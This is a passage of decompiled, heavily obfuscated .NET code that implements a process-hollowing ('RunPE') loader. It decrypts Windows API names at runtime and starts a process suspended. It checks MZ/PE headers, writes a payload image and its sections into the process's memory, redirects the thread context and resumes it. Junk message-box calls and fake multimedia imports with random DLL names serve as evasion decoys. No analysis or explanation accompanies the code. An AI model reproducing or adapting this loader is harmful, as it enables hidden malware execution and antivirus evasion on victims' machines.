			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
		}
		GCHandle gCHandle = GCHandle.Alloc(y3, GCHandleType.Pinned);
		if (Operators.CompareString("9043829483924,mflmdsfl", text, false) == 0)
		{
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"f093w4u0rt8h32t-h423-th32489-th324ht89", (MsgBoxStyle)0, (object)null);
		}
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), default(jsdhfs8A).GetType());
		jsdhfs8A jsdhfs8A = default(jsdhfs8A);
		jsdhfs8A jsdhfs8A2 = ((obj != null) ? ((jsdhfs8A)obj) : jsdhfs8A);
		gCHandle.Free();
		REw rEw = Bumbac<REw>(NH4u6p("hdd0a8UknYtMsNX6DnqgBg== ", "XBIsGImQ8+RSgzTVc5H1kg=="), NH4u6p("eQGoraDiSyAZWW3SkGTglQ== ", "5velewDC+WmUkJ1ovRBZuw=="));
		sCaf sCaf = Bumbac<sCaf>(NH4u6p("tSAydml16tOqiXqhcjb0iw== ", "53sEcEVq696rrJjb7DSZzA=="), NH4u6p("3/PtiskiYybniItuAKNqCRBFzSf5uhR7 ", "/+pyH2SKu6LAs/C9T9O1mVKE0igKgmLB"));
		PMN pMN = Bumbac<PMN>(NH4u6p("NVoMAbl8ya+0zjd0DHpVCA== ", "85j/77JqRhzW716vGC2ZUg=="), NH4u6p("KVcSL16XjARLrhdCQgnxLa0R966nvm4+ ", "xNhHvDOEN3HANy69E4H9aB8iXrEoPN1o"));
		o0Pe o0Pe = Bumbac<o0Pe>(NH4u6p("SHCafr4t5sUhVmpiKXRLqg== ", "la9AXTk/s8ABNV8/U0NAsw=="), NH4u6p("xIHMywKf+evTNLg2Fy5LawgLmZw1adx1 ", "0fbkR7g6EJM+HVs/WWqorg1p91tuYjM0"));
		grdf grdf = Bumbac<grdf>(NH4u6p("np/D2Jb/zl0= ", "RWP6l2wKvgw="), NH4u6p("tysxDoJG4/k3w1rUNbl50nuxS4zkHGc3 ", "ql5KydzwVMzLfBV+W3fAUABVFCp2ICwA"));
		mjQ mjQ = Bumbac<mjQ>(NH4u6p("3r8SeIcExGnA/GZzWpEbsA== ", "I+YjnhyCk6lHZEMDH03bMg=="), NH4u6p("/xX/arzBMX8ggHMS8AAyuQ== ", "Kd2eWKdlolXGwVbKRMyrDw=="));
		TuGxm tuGxm = Bumbac<TuGxm>(NH4u6p("j+MUD9fCpCw145TvT4rnBg== ", "LhMmghE7OWv8SJ4Ps/h1Mw=="), NH4u6p("YsDdFGBtmkCT/2/YgJsQmw8rAxELqfK2 ", "7o1nmPWU+sWHDLH8hZquTbU1ujI0f6Wh"));
		eZ3r eZ3r = Bumbac<eZ3r>(NH4u6p("1luQZaY4lJoiFgF6IXwYYg== ", "x8irXTv8hX73r3hKchdm4g=="), NH4u6p("BZ/7N4+fqvIaJkcjeR/PMg== ", "oVFAoC/OkCxh29CLI06HjA=="));
		IntPtr dU = default(IntPtr);
		if (0 - (rEw(null, ofL, ref PTm, ref jJM, rh0: false, 4u, dU, null, ref das43fsa, out Ck) ? 1 : 0) == 0)
		{
			return;
		}
		j9o j9o = default(j9o);
		checked
		{
			IntPtr ptr = new IntPtr(num + jsdhfs8A2.Da);
			object? obj2 = Marshal.PtrToStructure(ptr, j9o.GetType());
			j9o j9o2 = default(j9o);
			j9o = ((obj2 != null) ? ((j9o)obj2) : j9o2);
			string text2 = "abcdefgh";
			long num2 = default(long);
			if (Operators.CompareString("=--92e4n87876", text2, false) != 0)
			{
				das43fsa.tIl = Strings.Len((object)das43fsa);
				FTxO.Ii = 65539u;
				num2 = jsdhfs8A2.Da + 248;
			}
			if (unchecked((long)j9o.LLy) != 17744L || jsdhfs8A2.mr4 != 23117)
			{
				return;
			}
			int uZf;
			if (Operators.ConditionalCompareObjectNotEqual(Lu8(), (object)false, false))
			{
				sCaf(Ck.Rf, ref FTxO);
				IntPtr skYe = Ck.skYe;
				int al = (int)(unchecked((long)FTxO.WDA) + 8L);
				int dej = 0;
				uZf = 0;
				pMN(skYe, al, ref dej, 4, ref uZf);
				grdf(Ck.skYe, 0);
			}
			else
			{
				sCaf(Ck.Rf, ref FTxO);
				IntPtr skYe2 = Ck.skYe;
				int al2 = (int)(unchecked((long)FTxO.WDA) + 8L);
				long num3 = default(long);
				uZf = (int)num3;
				int dej = 0;
				pMN(skYe2, al2, ref uZf, 4, ref dej);
				num3 = uZf;
				grdf(Ck.skYe, (int)num3);
			}
			uint num4 = (uint)(int)mjQ(Ck.skYe, (int)j9o.Oo.Yo, j9o.Oo.O6, 12288u, 4u);
			if (unchecked((long)num4) == 0L)
			{
				return;
			}
			uint num5 = default(uint);
			if (Operators.ConditionalCompareObjectNotEqual(Lu8(), (object)false, false))
			{
				IntPtr skYe3 = Ck.skYe;
				int al3 = (int)num4;
				int uNJ = (int)j9o.Oo.Wu;
				uZf = (int)num5;
				o0Pe(skYe3, al3, y3, uNJ, out uZf);
				num5 = (uint)uZf;
			}
			else
			{
				IntPtr skYe4 = Ck.skYe;
				int al4 = (int)num4;
				int uNJ2 = (int)j9o.Oo.Wu;
				uZf = 0;
				o0Pe(skYe4, al4, y3, uNJ2, out uZf);
			}
			int num6 = unchecked((int)j9o.usY.o8y) - 1;
			BjMWZ bjMWZ = default(BjMWZ);
			BjMWZ bjMWZ2 = default(BjMWZ);
			for (int i = 0; i <= num6; i++)
			{
				ptr = new IntPtr(num + num2 + i * 40);
				object? obj3 = Marshal.PtrToStructure(ptr, bjMWZ.GetType());
				bjMWZ = ((obj3 != null) ? ((BjMWZ)obj3) : bjMWZ2);
				byte[] array = new byte[(int)bjMWZ.Da2 + 1];
				int num7 = (int)(unchecked((long)bjMWZ.Da2) - 1L);
				for (int j = 0; j <= num7; j++)
				{
					array[j] = y3[(int)(unchecked((long)bjMWZ.Po) + unchecked((long)j))];
				}
				IntPtr skYe5 = Ck.skYe;
				int al5 = (int)(num4 + bjMWZ.Al);
				int uNJ3 = (int)bjMWZ.Da2;
				uZf = Conversions.ToInteger(Operators.ConditionalCompareObjectNotEqual(Lu8(), (object)false, false) ? ((object)num5) : ((object)0));
				o0Pe(skYe5, al5, array, uNJ3, out uZf);
			}
			byte[] bytes = BitConverter.GetBytes(num4);
			IntPtr skYe6 = Ck.skYe;
			int al6 = (int)(unchecked((long)FTxO.WDA) + 8L);
			uZf = (int)num5;
			o0Pe(skYe6, al6, bytes, 4, out uZf);
			num5 = (uint)uZf;
			FTxO.AS4 = num4 + j9o.Oo.szwmiy;
			tuGxm(Ck.Rf, ref FTxO);
			eZ3r(Ck.Rf);
		}
	}

	[DllImport("id7E", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mciSetYieldProc(int mciId, int fpYieldProc, int dwYieldData);

	[DllImport("DkI0.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int midiInGetDevCapsA(int uDeviceID, MIDIINCAPS11 lpCaps, int uSize);

	[DllImport("KUt.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int midiInAddBuffer(int hMidiIn, MIDIHDR11 lpMidiInHdr, int uSize);

	[DllImport("vzcD.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetID(int hmxobj, int pumxID, int fdwId);

	[DllImport("BoM.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerGetNumDevs", ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetNumDevs_1();

	[DllImport("TAWV.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerMessage", ExactSpelling = true, SetLastError = true)]
	public static extern int mixerMessage_1(int hmx, int uMsg, int dwParam1, int dwParam2);

	[DllImport("Tqv8.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerOpen(int phmx, int uMxId, int dwCallback, int dwInstance, int fdwOpen);

	[DllImport("6ad.dll", CharSet = CharSet.Ansi, EntryPoint = "mmioClose", ExactSpelling = true, SetLastError = true)]
	public static extern int mmioClose_1(int hmmio, int uFlags);

	[DllImport("fD5.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerGetLineControlsA", ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetLineControlsA_1(int hmxobj, MIXERLINECONTROLS111 pmxlc, int fdwControls);

	[DllImport("yte.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerGetDevCapsA", ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetDevCapsA_1(int uMxId, MIXERCAPS11 pmxcaps, int cbmxcaps);

	[DllImport("Mtn.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerGetControlDetailsA", ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetControlDetailsA_1(int hmxobj, MIXERCONTROLDETAILS11 pmxcd, int fdwDetails);
}
